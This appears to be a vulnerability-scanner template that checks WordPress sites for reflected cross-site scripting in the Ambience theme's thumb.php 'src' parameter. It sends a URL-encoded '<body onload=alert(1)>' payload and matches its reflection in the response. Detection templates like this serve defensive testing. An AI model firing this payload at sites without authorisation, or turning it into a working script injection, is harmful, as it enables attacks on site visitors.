id: wp-ambience-xss

info:
  name: WordPress Theme Ambience - Cross-Site Scripting
  author: daffainfo
  severity: medium
  description: WordPress Theme Ambience is vulnerable to reflected cross-site scripting via the 'src' parameter.
  reference:
    - https://www.exploit-db.com/exploits/38568
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-79
  tags: wordpress,xss,wp-plugin

requests:
  - method: GET
    path:
      - '{{BaseURL}}/wp-content/themes/ambience/thumb.php?src=%3Cbody%20onload%3Dalert(1)%3E.jpg'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<body onload=alert(1)>"
        part: body

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200

